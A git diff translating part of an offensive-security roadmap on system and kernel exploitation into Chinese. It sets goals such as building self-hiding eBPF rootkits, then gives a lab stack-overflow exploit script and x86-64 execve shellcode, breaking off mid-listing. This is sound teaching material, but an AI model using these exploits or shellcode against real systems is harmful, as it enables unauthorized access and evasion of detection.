@@ -1,62 +1,62 @@
-# PHASE 3: SYSTEM & KERNEL EXPLOITATION
+# 阶段 3：系统与内核漏洞利用
 
-**Author:** Sagar Biswas ([@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT))<br/>
-**Canonical Repository:** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
-**Curated Ecosystem:** [Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)<br/>
-**License:** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
-**Version:** v1.0.0 · 2027 Edition<br/>
+**作者：** Sagar Biswas ([@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT))<br/>
+**权威仓库：** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
+**精选生态：** [Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)<br/>
+**许可证：** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
+**版本：** v1.0.0 · 2027 版<br/>
 
 <div align="right">
 
-**Where most people quit. Where real operators are made.**
+**大多数人止步于此。真正的操作员在这里诞生。**
 
 </div>
 
-**Duration:** 6-12 Months | **Difficulty:** Advanced to Extreme | **Hours/Week:** 35-40 | **Prerequisites:** Phase 2 Complete | **Completion Rate:** 20% of remaining
+**时长：** 6-12 个月 | **难度：** 高级至极限 | **每周小时：** 35-40 | **先修要求：** 完成阶段 2 | **完成率：** 剩余内容的 20%
 
 ---
 
-## TABLE OF CONTENTS
+## 目录
 
-1. [Who This Phase Is For](#who-this-phase-is-for)
-2. [Phase 3 Architecture Map](#phase-3-architecture-map)
-3. [Timeline](#timeline)
-4. [Goal and Checkpoints](#goal-and-checkpoints)
-5. [Milestone Projects](#milestone-projects)
-6. [Block 0: Environment Setup](#block-0-environment-setup)
-7. [Block 1: Binary Exploitation Fundamentals](#block-1-binary-exploitation-fundamentals)
-8. [Block 2: Shellcode Writing](#block-2-shellcode-writing)
-9. [Block 3: Exploit Mitigations and Bypass](#block-3-exploit-mitigations-and-bypass)
-10. [Block 4: Format String Vulnerabilities](#block-4-format-string-vulnerabilities)
-11. [Block 5: Heap Exploitation -- Linux glibc Modern](#block-5-heap-exploitation----linux-glibc-modern)
-12. [Block 6: Windows Heap Exploitation](#block-6-windows-heap-exploitation)
-13. [Block 7: Linux Kernel Exploitation](#block-7-linux-kernel-exploitation)
-14. [Block 8: Linux Kernel SLUB/Slab Exploitation](#block-8-linux-kernel-slubslab-exploitation)
-15. [Block 9: Windows Kernel Exploitation](#block-9-windows-kernel-exploitation)
-16. [Block 10: ARM64 Exploitation + PAC Bypass](#block-10-arm64-exploitation--pac-bypass)
-17. [Block 11: Control Flow Guard Bypass](#block-11-control-flow-guard-bypass)
-18. [Block 12: Linux eBPF Rootkits + Anti-Detection](#block-12-linux-ebpf-rootkits--anti-detection)
-19. [Block 13: HVCI, VBS and Kernel Security 2026-2027](#block-13-hvci-vbs-and-kernel-security-2026-2027)
-20. [Block 14: Mobile Security -- Android and iOS](#block-14-mobile-security----android-and-ios)
-21. [CTF Progression and Lab Resources](#ctf-progression-and-lab-resources)
-
----
-
-## WHO THIS PHASE IS FOR
-
-You finished Phase 2. You can enumerate a network, pivot, spray credentials, break WPA2.
-Now you go lower: below the application, below the OS, below the kernel.
-
-Phase 3 teaches you to **write exploits from first principles.** Not to use Metasploit.
-Not to paste PoC code. To understand what is happening at the instruction level and build
-the primitive yourself. By the end of this phase you are in the top 5% of practitioners
-worldwide.
-
-**No shortcuts. No "I ran the exploit." No surface knowledge.**
+1. [本阶段适合谁](#本阶段适合谁)
+2. [阶段 3 架构图](#阶段-3-架构图)
+3. [时间线](#时间线)
+4. [目标与检查点](#目标与检查点)
+5. [里程碑项目](#里程碑项目)
+6. [区块 0：环境搭建](#区块-0环境搭建)
+7. [区块 1：二进制漏洞利用基础](#区块-1二进制漏洞利用基础)
+8. [区块 2：Shellcode 编写](#区块-2shellcode-编写)
+9. [区块 3：漏洞利用缓解与绕过](#区块-3漏洞利用缓解与绕过)
+10. [区块 4：格式化字符串漏洞](#区块-4格式化字符串漏洞)
+11. [区块 5：堆利用 -- Linux glibc 现代](#区块-5堆利用----linux-glibc-现代)
+12. [区块 6：Windows 堆利用](#区块-6windows-堆利用)
+13. [区块 7：Linux 内核利用](#区块-7linux-内核利用)
+14. [区块 8：Linux 内核 SLUB/Slab 利用](#区块-8linux-内核-slubslab-利用)
+15. [区块 9：Windows 内核利用](#区块-9windows-内核利用)
+16. [区块 10：ARM64 利用 + PAC 绕过](#区块-10arm64-利用--pac-绕过)
+17. [区块 11：控制流保护（CFG）绕过](#区块-11控制流保护cfg绕过)
+18. [区块 12：Linux eBPF 后门 + 反检测](#区块-12linux-ebpf-后门--反检测)
+19. [区块 13：HVCI、VBS 与 2026-2027 内核安全](#区块-13hvcivbs-与-2026-2027-内核安全)
+20. [区块 14：移动安全 -- Android 与 iOS](#区块-14移动安全----android-与-ios)
+21. [CTF 进阶与实验资源](#ctf-进阶与实验资源)
 
 ---
 
-## PHASE 3 ARCHITECTURE MAP
+## 本阶段适合谁
+
+你已经完成了阶段 2。你能枚举网络、横向移动、喷洒凭据、破解 WPA2。
+现在你要往更底层走：应用之下、操作系统之下、内核之下。
+
+阶段 3 教你**从第一性原理出发编写漏洞利用。** 不是使用 Metasploit。
+不是粘贴 PoC 代码。而是理解指令层面正在发生什么，并亲手构建
+原语。到本阶段结束时，你已跻身全球前 5%
+从业者之列。
+
+**没有捷径。没有“我跑通了漏洞利用”。没有表面知识。**
+
+---
+
+## 阶段 3 架构图
 
 <div align="center">
 <table><tr><td>
@@ -67,93 +67,93 @@ worldwide.
 </div>
 
 
-## TIMELINE
+## 时间线
 
-| Block | Content | Duration | Difficulty |
+| 区块 | 内容 | 时长 | 难度 |
 |---|---|---|---|
-| 0 | Environment Setup | 3-5 days | Medium |
-| 1 | Binary Exploitation Fundamentals | 4-6 weeks | Very Hard |
-| 2 | Shellcode Writing | 2-3 weeks | Very Hard |
-| 3 | Mitigations and Bypass (ROP) | 4-6 weeks | Extreme |
-| 4 | Format Strings | 1-2 weeks | Hard |
-| 5 | Heap (Linux glibc) | 4-5 weeks | Extreme |
-| 6 | Windows Heap | 3-4 weeks | Extreme |
-| 7 | Linux Kernel | 4-6 weeks | Extreme |
-| 8 | Linux Kernel SLUB | 2-3 weeks | Extreme |
-| 9 | Windows Kernel | 4-6 weeks | Extreme |
-| 10 | ARM64 + PAC Bypass | 3-4 weeks | Very Hard |
-| 11 | CFG Bypass | 1-2 weeks | Extreme |
-| 12 | eBPF Rootkits + Anti-Detection | 4-6 weeks | Extreme |
-| 13 | HVCI / VBS | 2-3 weeks | Extreme |
-| 14 | Mobile (Android + iOS + CVE) | 6-8 weeks | Very Hard |
-| **TOTAL** | | **6-12 months** | |
+| 0 | 环境搭建 | 3-5 天 | 中等 |
+| 1 | 二进制漏洞利用基础 | 4-6 周 | 非常难 |
+| 2 | Shellcode 编写 | 2-3 周 | 非常难 |
+| 3 | 缓解措施与绕过（ROP） | 4-6 周 | 极限 |
+| 4 | 格式化字符串 | 1-2 周 | 难 |
+| 5 | 堆（Linux glibc） | 4-5 周 | 极限 |
+| 6 | Windows 堆 | 3-4 周 | 极限 |
+| 7 | Linux 内核 | 4-6 周 | 极限 |
+| 8 | Linux 内核 SLUB | 2-3 周 | 极限 |
+| 9 | Windows 内核 | 4-6 周 | 极限 |
+| 10 | ARM64 + PAC 绕过 | 3-4 周 | 非常难 |
+| 11 | CFG 绕过 | 1-2 周 | 极限 |
+| 12 | eBPF 后门 + 反检测 | 4-6 周 | 极限 |
+| 13 | HVCI / VBS | 2-3 周 | 极限 |
+| 14 | 移动端（Android + iOS + CVE） | 6-8 周 | 非常难 |
+| **总计** | | **6-12 个月** | |
 
-> **Honest note on time:** 35-40 hours/week is the stated commitment. Block 0 alone can eat a week if your kernel build environment breaks. Budget for it. Blocks 7-10 regularly take longer than estimated. The range exists because depth does.
-
----
-
-## GOAL AND CHECKPOINTS
-
-**Low-level exploitation from first principles. Write exploits from scratch. Understand the CPU, the memory manager, the kernel: on Linux AND Windows, on x86-64 AND ARM64.**
-
-By the end of Phase 3 you are dangerous to most hardened targets -- not because you run tools, but because you understand what the tools do and can rebuild them when they fail.
-
-### What You Must Demonstrate by the End
-
-- Write stack-based buffer overflow exploits from scratch (no tools, no pasting)
-- Write custom shellcode: x86-64 Linux AND Windows syscalls, null-free
-- Bypass: stack canary, NX/DEP, ASLR (information leak + ROP), PIE
-- Build ROP chains manually and with pwntools
-- Exploit format string vulnerabilities: leak + write on full RELRO + glibc 2.35 targets
-- Exploit heap UAF/double-free using tcache poisoning with Safe-Linking bypass
-- Use FSOP or `__exit_funcs` as write target on post-glibc 2.34 systems
-- Write Linux kernel privilege escalation exploit (user to root) from scratch
-- Perform SLUB cross-cache attack on a custom kernel module
-- Execute elastic objects technique bridging two size classes
-- Debug Windows kernel with WinDbg, exploit HEVD stack overflow, steal token
-- Write ARM64 shellcode (execve /bin/sh) from scratch
-- **Execute a data-only ARM64 exploit chain that bypasses PAC without triggering authentication failure**
-- Bypass Control Flow Guard (CFG): demonstrate working bypass, not just describe it
-- Write and load a working eBPF rootkit that hides a file from ls
-- **Load an eBPF rootkit that also hides itself from `bpftool prog list`**
-- Analyze a real CVE: root cause understood, custom PoC written, not copy-pasted
-- **Walk through a complete iOS kernel UAF exploitation chain from bug to root**
+> **关于时间的坦诚说明：** 每周 35-40 小时是声明的投入。如果你的内核构建环境出问题，仅区块 0 就能吃掉一周。要为此预留时间。区块 7-10 经常比预估耗时更长。区间之所以存在，是因为深度本身就会波动。
 
 ---
 
-## MILESTONE PROJECTS
+## 目标与检查点
 
-All milestones require a working deliverable plus a written root cause analysis.
-"It ran and gave me a shell" is **not** a deliverable. Understanding why it works is the deliverable.
+**自第一性原理出发的底层漏洞利用。从零编写漏洞利用。理解 CPU、内存管理器、内核：在 Linux 和 Windows 上，在 x86-64 和 ARM64 上。**
 
-| # | Project | Week | Deliverable |
+到阶段 3 结束时，你对大多数加固目标都具有威胁——不是因为你运行工具，而是因为你理解工具在做什么，并且能在它们失效时重建它们。
+
+### 到结束时你必须展示的能力
+
+- 从零编写基于栈的缓冲区溢出漏洞利用（不用工具、不粘贴）
+- 编写自定义 shellcode：x86-64 Linux 和 Windows 系统调用，不含空字节
+- 绕过：栈 canary、NX/DEP、ASLR（信息泄露 + ROP）、PIE
+- 手动并使用 pwntools 构建 ROP 链
+- 利用格式化字符串漏洞：在全 RELRO + glibc 2.35 目标上实现泄露 + 写入
+- 利用 tcache 投毒配合 Safe-Linking 绕过，利用堆 UAF/双重释放
+- 在 glibc 2.34 之后的系统上使用 FSOP 或 `__exit_funcs` 作为写入目标
+- 从零编写 Linux 内核提权漏洞利用（用户到 root）
+- 对自定义内核模块执行 SLUB 跨缓存攻击
+- 执行弹性对象（elastic objects）技术，桥接两个尺寸类
+- 用 WinDbg 调试 Windows 内核，利用 HEVD 栈溢出，窃取令牌
+- 从零编写 ARM64 shellcode（execve /bin/sh）
+- **执行仅数据（data-only）的 ARM64 利用链，在不触发认证失败的情况下绕过 PAC**
+- 绕过控制流保护（CFG）：演示可用的绕过，而不只是描述它
+- 编写并加载可用的 eBPF 后门，对 ls 隐藏文件
+- **加载一个还能对 `bpftool prog list` 隐藏自身的 eBPF 后门**
+- 分析真实 CVE：理解根因，编写自定义 PoC，而非复制粘贴
+- **完整走通一条 iOS 内核 UAF 利用链，从缺陷到 root**
+
+---
+
+## 里程碑项目
+
+所有里程碑都要求一个可运行的交付物，外加一份书面的根因分析。
+“它跑起来并给了我一个 shell”**不算**交付物。理解它为何有效才是交付物。
+
+| # | 项目 | 周 | 交付物 |
 |---|---|---|---|
-| M1 | Stack overflow exploit (no protections) | 4-6 | Python script + root cause write-up |
-| M2 | Canary + ASLR bypass via info leak + ROP | 8-12 | Working exploit + ROP chain annotated |
-| M3 | Format string: leak libc + write on glibc 2.35 (no `__malloc_hook`) | 12-14 | Working exploit using FSOP or `__exit_funcs` |
-| M4 | Heap UAF + tcache poisoning with Safe-Linking bypass | 16-20 | Working exploit on glibc 2.35 target |
-| M5 | Linux kernel LPE: real CVE, written from scratch | 20-28 | Root shell + detailed analysis |
-| M6 | Linux kernel SLUB cross-cache + elastic objects | 28-32 | Root shell via cross-cache UAF + written technique comparison |
-| M7 | Windows kernel LPE: HEVD stack overflow + token steal | 32-40 | SYSTEM shell on Windows 10/11 VM |
-| M8 | ARM64 shellcode execve(/bin/sh) + data-only PAC bypass demo | 40-44 | Working shellcode + PAC bypass annotated trace |
-| M9 | CFG bypass PoC on a real Windows binary | 44-48 | Working bypass + explanation |
-| M10 | eBPF rootkit: hide file from ls AND hide itself from bpftool | 48-52 | Working .bpf.o + loader, both capabilities verified |
-| M11 | iOS CVE walkthrough: complete chain from bug to escalation | 52-56 | Written analysis + annotated skeleton exploit |
+| M1 | 栈溢出利用（无保护） | 4-6 | Python 脚本 + 根因分析文档 |
+| M2 | 通过信息泄露 + ROP 绕过 Canary + ASLR | 8-12 | 可用的利用 + 带注释的 ROP 链 |
+| M3 | 格式化字符串：在 glibc 2.35 上泄露 libc + 写入（无 `__malloc_hook`） | 12-14 | 使用 FSOP 或 `__exit_funcs` 的可用利用 |
+| M4 | 堆 UAF + tcache 投毒配合 Safe-Linking 绕过 | 16-20 | 在 glibc 2.35 目标上可用的利用 |
+| M5 | Linux 内核 LPE：真实 CVE，从零编写 | 20-28 | root shell + 详细分析 |
+| M6 | Linux 内核 SLUB 跨缓存 + 弹性对象 | 28-32 | 通过跨缓存 UAF 获得 root shell + 书面技术对比 |
+| M7 | Windows 内核 LPE：HEVD 栈溢出 + 令牌窃取 | 32-40 | 在 Windows 10/11 虚拟机上获得 SYSTEM shell |
+| M8 | ARM64 shellcode execve(/bin/sh) + 仅数据 PAC 绕过演示 | 40-44 | 可用的 shellcode + 带注释的 PAC 绕过轨迹 |
+| M9 | 真实 Windows 二进制上的 CFG 绕过 PoC | 44-48 | 可用的绕过 + 说明 |
+| M10 | eBPF 后门：对 ls 隐藏文件，并对自己从 bpftool 隐藏 | 48-52 | 可用的 .bpf.o + 加载器，两项能力均已验证 |
+| M11 | iOS CVE 走查：从缺陷到提权的完整链 | 52-56 | 书面分析 + 带注释的骨架利用 |
 
 ---
 
-## BLOCK 0: ENVIRONMENT SETUP
+## 区块 0：环境搭建
 
-> Beginners waste days failing because their environment is broken.
-> Set this up correctly before writing one line of exploit code.
+> 初学者会浪费数天，只因环境有问题而失败。
+> 在写第一行漏洞利用代码之前，先把环境配置正确。
 
-### Linux Exploitation Lab
+### Linux 漏洞利用实验环境
 
 ```bash
-# OS: Ubuntu 22.04 LTS (recommended -- glibc 2.35 matches real 2027 targets)
-# Use a VM: VirtualBox or VMware Workstation
+# 操作系统：Ubuntu 22.04 LTS（推荐——glibc 2.35 与真实的 2027 目标匹配）
+# 使用虚拟机：VirtualBox 或 VMware Workstation
 
-# Core tools
+# 核心工具
 sudo apt update && sudo apt install -y \
     gcc g++ gdb python3 python3-pip git nasm \
     build-essential libc6-dbg patchelf \
@@ -166,11 +166,11 @@ sudo apt update && sudo apt install -y \
 # pwntools
 pip3 install pwntools
 
-# Test pwntools:
+# 测试 pwntools：
 python3 -c "from pwn import *; print(asm(shellcraft.amd64.linux.sh()).hex())"
-# Expected: long hex string of shellcode bytes
+# 预期：一长串十六进制的 shellcode 字节
 
-# pwndbg (replaces vanilla GDB entirely)
+# pwndbg（完全取代原版 GDB）
 git clone https://github.com/pwndbg/pwndbg
 cd pwndbg && ./setup.sh
 
@@ -181,83 +181,83 @@ pip3 install ropper
 # checksec
 pip3 install checksec
 
-# glibc debug symbols (mandatory for heap debugging)
+# glibc 调试符号（堆调试必需）
 sudo apt install -y libc6-dbg
 ```
 
-### GDB Quickstart -- Essential Commands
+### GDB 快速入门——常用命令
 
 ```bash
-gdb ./binary           # load binary
-r                      # run
-r arg1 arg2            # run with arguments
-r <<< $(python3 -c "print('A'*100)")  # run with inline payload
+gdb ./binary           # 加载二进制文件
+r                      # 运行
+r arg1 arg2            # 带参数运行
+r <<< $(python3 -c "print('A'*100)")  # 使用内联载荷运行
 
-# Breakpoints:
-b main                 # break at function name
-b *0x401234            # break at exact address
-b *main+32             # break at offset
+# 断点：
+b main                 # 在函数名处下断点
+b *0x401234            # 在精确地址处下断点
+b *main+32             # 在偏移处下断点
 
-# Stepping:
-ni                     # next instruction (step over calls)
-si                     # step instruction (step into calls)
-c                      # continue
-finish                 # run until current function returns
+# 单步执行：
+ni                     # 下一条指令（步过调用）
+si                     # 单步指令（步入调用）
+c                      # 继续
+finish                 # 运行到当前函数返回
 
-# Inspection:
-x/20gx $rsp            # examine 20 quadwords at RSP
-x/s 0x4040a0           # examine as string
-info registers         # all registers
-info proc mappings     # memory map
+# 检查：
+x/20gx $rsp            # 检查 RSP 处的 20 个四字（quadword）
+x/s 0x4040a0           # 按字符串检查
+info registers         # 所有寄存器
+info proc mappings     # 内存映射
 
-# pwndbg-specific:
-context                # full context pane
-heap                   # heap chunks
-heap bins              # bin contents
-vis_heap_chunks        # visual heap layout
-search -s "/bin/sh"    # search all memory
-cyclic 200             # De Bruijn pattern
-cyclic -l 0x6161616b   # find offset
-telescope $rsp         # dereference chain
+# pwndbg 专用：
+context                # 完整上下文面板
+heap                   # 堆块
+heap bins              # bin 内容
+vis_heap_chunks        # 可视化堆布局
+search -s "/bin/sh"    # 搜索全部内存
+cyclic 200             # De Bruijn 模式
+cyclic -l 0x6161616b   # 查找偏移
+telescope $rsp         # 解引用链
 ```
 
-### Windows Exploitation Lab
+### Windows 漏洞利用实验环境
 
 ```
-Requirements:
-- Windows 10 22H2 or Windows 11 23H2 VM (user-mode exploitation)
-- Windows 10 22H2 VM (TARGET for kernel debugging -- separate VM)
-- WinDbg Preview (DEBUGGER -- can be on host)
+环境要求：
+- Windows 10 22H2 或 Windows 11 23H2 虚拟机（用户态利用）
+- Windows 10 22H2 虚拟机（内核调试的目标机——独立虚拟机）
+- WinDbg Preview（调试器——可放在宿主机）
 
-Tools on the Windows VM:
-1. Visual Studio 2022 Community (C/C++ workload)
-2. WinDbg Preview: winget install Microsoft.WinDbgPreview
-3. x64dbg: https://x64dbg.com/
+Windows 虚拟机上的工具：
+1. Visual Studio 2022 Community（C/C++ 工作负载）
+2. WinDbg Preview：winget install Microsoft.WinDbgPreview
+3. x64dbg：https://x64dbg.com/
 4. PE-bear / CFF Explorer
 5. Process Hacker 2
 6. Python 3.11 + pip
 
-For ARM64 exploitation:
-- QEMU AArch64 system emulation (on Linux host)
-- pwn.college ARM64 challenges (cloud-based)
+面向 ARM64 利用：
+- QEMU AArch64 系统模拟（在 Linux 宿主机上）
+- pwn.college ARM64 挑战（基于云端）
 ```
 
 ---
 
-## BLOCK 1: BINARY EXPLOITATION FUNDAMENTALS
+## 区块 1：二进制漏洞利用基础
 
-**Time: 4-6 weeks | Difficulty: Very Hard**
+**时间：4-6 周 | 难度：非常难**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeY) | YouTube | 20 hrs | FREE | Watch every video. Code along. No skipping. |
-| [Smashing the Stack for Fun and Profit](http://www.phrack.org/issues/49/14.html) | Article | 3 hrs | FREE | Phrack #49. The original. Read twice. |
-| [pwn.college](https://pwn.college) | Platform | 40 hrs | FREE | ASU university platform. Best structured binary course. |
-| [Nightmare CTF Guide](https://guyinatuxedo.github.io/) | Guide | 15 hrs | FREE | Worked CTF examples. Excellent supplemental. |
+| [LiveOverflow 二进制漏洞利用](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeY) | YouTube | 20 小时 | 免费 | 看完每个视频。跟着写代码。不要跳过。 |
+| [Smashing the Stack for Fun and Profit](http://www.phrack.org/issues/49/14.html) | 文章 | 3 小时 | 免费 | Phrack 第 49 期。开山之作。读两遍。 |
+| [pwn.college](https://pwn.college) | 平台 | 40 小时 | 免费 | ASU 大学平台。结构最好的二进制课程。 |
+| [Nightmare CTF 指南](https://guyinatuxedo.github.io/) | 指南 | 15 小时 | 免费 | 带讲解的 CTF 实例。极佳的补充材料。 |
 
-### Memory Layout: x86-64 Linux Process
+### 内存布局：x86-64 Linux 进程
 
 <div align="center">
 <table><tr><td>
@@ -267,36 +267,36 @@ For ARM64 exploitation:
 </td></tr></table>
 </div>
 
-**Key fact:** Stack grows DOWN. When you declare local variables, they sit at LOWER addresses than the saved return address. Buffer overflow writes past the end of a local array, overwrites saved RBP, overwrites return address, giving you control of RIP.
+**关键事实：** 栈向低地址（向下）增长。当你声明局部变量时，它们位于比保存的返回地址更低的地址。缓冲区溢出会写过局部数组的末尾，覆盖保存的 RBP，覆盖返回地址，从而让你控制 RIP。
 
-### x86-64 Calling Convention (System V AMD64 ABI)
+### x86-64 调用约定（System V AMD64 ABI）
 
 ```
-Integer/pointer arguments go in registers (left to right):
-  1st arg: RDI
-  2nd arg: RSI
-  3rd arg: RDX
-  4th arg: RCX
-  5th arg: R8
-  6th arg: R9
-  7th+ arg: pushed on stack (right to left)
+整数/指针参数按从左到右放入寄存器：
+  第 1 个参数：RDI
+  第 2 个参数：RSI
+  第 3 个参数：RDX
+  第 4 个参数：RCX
+  第 5 个参数：R8
+  第 6 个参数：R9
+  第 7 个及以后：压入栈（从右到左）
 
-Return value: RAX (64-bit) or EAX (32-bit)
+返回值：RAX（64 位）或 EAX（32 位）
 
-Caller-saved: RAX, RCX, RDX, RSI, RDI, R8-R11
-Callee-saved: RBX, RBP, R12-R15
+调用者保存：RAX、RCX、RDX、RSI、RDI、R8-R11
+被调用者保存：RBX、RBP、R12-R15
 
-CRITICAL: Stack must be 16-byte aligned before CALL instruction.
-After CALL pushes the return address, RSP is 8-byte aligned.
-MOVAPS (SSE instructions) crash on unaligned stack.
-Fix: insert a bare 'ret' gadget before calling system() to re-align.
+关键：CALL 指令之前，栈必须 16 字节对齐。
+CALL 压入返回地址后，RSP 是 8 字节对齐。
+MOVAPS（SSE 指令）在未对齐的栈上会崩溃。
+修复：在调用 system() 前插入一个裸 'ret' gadget 以重新对齐。
 ```
 
-### First Exploit: Stack Buffer Overflow (No Protections)
+### 第一个漏洞利用：栈缓冲区溢出（无保护）
 
 ```c
-// File: vuln.c
-// Compile: gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack
+// 文件：vuln.c
+// 编译：gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack
 
 #include <stdio.h>
 #include <string.h>
@@ -319,32 +319,32 @@ int main(int argc, char *argv[]) {
 ```
 
 ```bash
-# Step 1: Check protections
+# 第 1 步：检查保护机制
 checksec --file=./vuln
-# Expected: RELRO: Partial | Stack Canary: No | NX: disabled | PIE: No
+# 预期：RELRO: Partial | Stack Canary: No | NX: disabled | PIE: No
 
-# Step 2: Find win() address
+# 第 2 步：查找 win() 地址
 objdump -d ./vuln | grep '<win>'
-# Example: 0000000000401196 <win>:
+# 示例：0000000000401196 <win>:
 
-# Step 3: Find offset using De Bruijn pattern
+# 第 3 步：使用 De Bruijn 模式查找偏移
 gdb -q ./vuln
 r $(python3 -c "from pwn import *; print(cyclic(200).decode())")
-# Crashes with SIGSEGV -- pwndbg shows RSP value
+# 触发 SIGSEGV 崩溃——pwndbg 会显示 RSP 的值
 
 python3 -c "from pwn import *; print(cyclic_find(0x6161616b))"
-# Output: 72
-# Means: 64 bytes (buf) + 8 bytes (saved RBP) = 72 bytes before return addr
+# 输出：72
+# 含义：64 字节（buf）+ 8 字节（保存的 RBP）= 返回地址之前的 72 字节
 ```
 
 ```python
-# File: exploit.py
+# 文件：exploit.py
 from pwn import *
 
 p = process('./vuln')
 
 offset   = 72
-win_addr = 0x401196     # replace with YOUR actual value
+win_addr = 0x401196     # 替换为你自己的实际值
 
 payload  = b'A' * offset
 payload += p64(win_addr)
@@ -353,7 +353,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-### Stack Frame Visualization
+### 栈帧可视化
 
 <div align="center">
 <table><tr><td>
@@ -365,33 +365,33 @@ p.interactive()
 
 ---
 
-## BLOCK 2: SHELLCODE WRITING
+## 区块 2：Shellcode 编写
 
-**Time: 2-3 weeks | Difficulty: Very Hard**
+**时间：2-3 周 | 难度：非常难**
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [Writing Shellcode - YouTube](https://www.youtube.com/watch?v=ixptghqAVnk) | YouTube | 3 hrs | FREE | Start here. |
-| [Shell-storm Shellcode DB](http://shell-storm.org/shellcode/) | Reference | 5 hrs | FREE | Study, do not copy -- understand each one. |
-| [x86-64 Linux Syscall Table](https://filippo.io/linux-syscall-table/) | Reference | 1 hr | FREE | Keep this open while writing assembly. |
+| [编写 Shellcode - YouTube](https://www.youtube.com/watch?v=ixptghqAVnk) | YouTube | 3 小时 | 免费 | 从这里开始。 |
+| [Shell-storm Shellcode 数据库](http://shell-storm.org/shellcode/) | 参考 | 5 小时 | 免费 | 研究，不要复制——理解每一个。 |
+| [x86-64 Linux 系统调用表](https://filippo.io/linux-syscall-table/) | 参考 | 1 小时 | 免费 | 编写汇编时保持打开。 |
 
-### x86-64 Linux Syscall Convention
+### x86-64 Linux 系统调用约定
 
 ```
-Syscall calling convention (x86-64 Linux):
-  syscall number: RAX
-  arg1:           RDI
-  arg2:           RSI
-  arg3:           RDX
-  arg4:           R10  (NOT RCX -- differs from function calling convention)
-  arg5:           R8
-  arg6:           R9
-  execute:        SYSCALL instruction
-  return value:   RAX
+系统调用约定（x86-64 Linux）：
+  系统调用号：RAX
+  参数 1：          RDI
+  参数 2：          RSI
+  参数 3：          RDX
+  参数 4：          R10（不是 RCX——与函数调用约定不同）
+  参数 5：          R8
+  参数 6：          R9
+  执行：          SYSCALL 指令
+  返回值：        RAX
 
-KEY SYSCALL NUMBERS:
+关键系统调用号：
    0 = read(fd, buf, count)
    1 = write(fd, buf, count)
    2 = open(path, flags, mode)
@@ -400,12 +400,12 @@ KEY SYSCALL NUMBERS:
  231 = exit_group(status)
 ```
 
-### Minimal execve("/bin/sh") Shellcode -- x86-64 Linux
+### 最小 execve("/bin/sh") Shellcode——x86-64 Linux
 
 ```nasm
-; File: shellcode.asm
-; Goal: execve("/bin/sh", NULL, NULL)
-; RAX=59, RDI=ptr to "/bin/sh", RSI=NULL, RDX=NULL
+; 文件：shellcode.asm
+; 目标：execve("/bin/sh", NULL, NULL)
+; RAX=59，RDI 指向 "/bin/sh" 的指针，RSI=NULL，RDX=NULL
 
 section .text
 global _start
@@ -413,25 +413,25 @@ global _start
 _start:
     xor rdx, rdx                    ; envp = NULL
     xor rsi, rsi                    ; argv = NULL
-    push rdx                        ; null terminator
+    push rdx                        ; 空终止符
     mov rax, 0x68732f2f6e69622f    ; "/bin//sh"
     push rax
-    mov rdi, rsp                    ; rdi = pointer to string
+    mov rdi, rsp                    ; rdi = 字符串指针
     push 59
-    pop rax                         ; rax = 59, no null bytes
+    pop rax                         ; rax = 59，无空字节
     syscall
 
-; Compile and test:
+; 编译并测试：
 ; nasm -f elf64 shellcode.asm -o shellcode.o
 ; ld shellcode.o -o shellcode
 ; ./shellcode
 ```
 
 ```bash
-# Extract raw shellcode bytes:
+# 提取原始 shellcode 字节：
 objdump -d shellcode.o | grep -Po '[0-9a-f]{2} ' | tr -d ' \n'
 
-# Or use pwntools:
+# 或使用 pwntools：
 python3 -c "
 from pwn import *
 context.arch = 'amd64'
@@ -441,7 +441,7 @@ print(f'Hex: {sc.hex()}')
 print(f'Length: {len(sc)} bytes')
 "
 
-# Test shellcode in a harness:
+# 在测试框架中测试 shellcode：
 cat > test_sc.c << 'EOF'
 #include <stdio.h>
 #include <sys/mman.h>
@@ -459,34 +459,34 @@ EOF
 gcc -o test_sc test_sc.c && ./test_sc
 ```
 
-### Avoiding Null Bytes
+### 避免空字节
 
 ```nasm
-; PROBLEM: null bytes stop strcpy/gets depending on the vulnerability
-; mov rax, 59  produces: 48 C7 C0 3B 00 00 00  (three nulls)
+; 问题：空字节会中断 strcpy/gets，具体取决于漏洞
+; mov rax, 59 产生：48 C7 C0 3B 00 00 00（三个空字节）
 
-; SOLUTIONS:
+; 解决方案：
 
-; 1. XOR to zero a register
-xor rax, rax            ; rax = 0  -- encodes as 48 31 C0 (no nulls)
+; 1. 用 XOR 将寄存器清零
+xor rax, rax            ; rax = 0——编码为 48 31 C0（无空字节）
 xor rdx, rdx            ; rdx = 0
 
-; 2. PUSH small immediate + POP
-push 59                 ; 6A 3B (one-byte immediate, no zero padding)
+; 2. PUSH 小立即数 + POP
+push 59                 ; 6A 3B（单字节立即数，无零填充）
 pop rax                 ; 58
 
-; 3. Build strings on the stack
+; 3. 在栈上构建字符串
 xor rax, rax
